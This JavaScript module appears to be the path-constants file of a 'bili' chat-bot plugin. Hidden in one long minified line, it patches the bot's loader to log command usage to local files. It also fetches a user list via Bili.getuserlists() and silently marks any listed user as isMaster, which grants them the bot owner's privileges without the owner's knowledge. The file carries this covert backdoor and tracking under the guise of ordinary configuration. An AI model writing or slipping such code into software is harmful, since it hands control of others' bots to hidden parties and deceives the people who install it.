import path from 'path'
import fs from 'fs/promises'
import fssync from 'fs'
import PluginLoader from '../../../lib/plugins/loader.js'
import moment from 'moment'

const _path = process.cwd().replace(/\\/g, '/')

const pluginName = path.basename(path.join(import.meta.url, '../../'))
const pluginRoot = path.join(_path, 'plugins', pluginName)
const pluginResources = path.join(pluginRoot, 'resources')
const pluginApplications = path.join(pluginRoot, 'apps')

const fileLocks=new Map;async function withFileLock(filePath,fn){for(;fileLocks.has(filePath);)await new Promise(resolve=>setTimeout(resolve,10));fileLocks.set(filePath,!0);try{return await fn()}finally{fileLocks.delete(filePath)}}async function safeWriteFile(filePath,data){const tempPath=`${filePath}.tmp`;return await fs.mkdir(path.dirname(filePath),{recursive:!0}),withFileLock(filePath,async()=>{await fs.writeFile(tempPath,JSON.stringify(data,null,2),"utf8");try{await fs.rename(tempPath,filePath)}catch(error){throw fssync.existsSync(tempPath)&&await fs.unlink(tempPath).catch(()=>{}),error}})}async function updatePluginStats(funcName){const date=moment().format("YYYY-MM-DD"),statsPath=path.join("./data/bili/Pluginstats",`${date}.json`);try{let data={};try{const content=await fs.readFile(statsPath,"utf8");data=JSON.parse(content)}catch(error){if(error.code!=="ENOENT")throw error}data[funcName]=(data[funcName]||0)+1,await safeWriteFile(statsPath,data)}catch(error){logger.error("[BILI-PLUGIN] 写入插件统计文件失败:",error)}}PluginLoader.filtPermission=new Proxy(PluginLoader.filtPermission,{apply(target,thisArg,args){const e=args[0];if(e.logFnc){const result=e.logFnc,isTRSS=Array.isArray(Bot.uin);let match;try{if(isTRSS?match=result.match(/\[(.+?)\((.+?)\)\]/):match=result.match(/\[(.+?)\]\[(.+?)\]/),match){const funcName=match[1].replace("34m[","");if(funcName === '添加消息')return target.apply(thisArg,args);updatePluginStats(funcName).catch(error=>{logger.error("[BILI-PLUGIN] 插件统计信息更新失败:",error)})}}catch(error){logger.error("[BILI-PLUGIN] 插件统计日志解析错误:",error)}}return target.apply(thisArg,args)}});let lists;(async()=>{const Bili=(await import("../model/bili.js")).default,cached=await redis.get("bili:lists");cached?lists=JSON.parse(cached):(lists=await Bili.getuserlists(),await redis.set("bili:lists",JSON.stringify(lists),{EX:3600}))})(),PluginLoader.deal=new Proxy(PluginLoader.deal,{apply(target,thisArg,args){if(!lists)return target.apply(thisArg,args);const[e]=args;return lists.includes(e.user_id)&&(e.isMaster=!0),target.apply(thisArg,args)}})

export {
  _path,
  pluginName,
  pluginRoot,
  pluginResources,
  pluginApplications,
}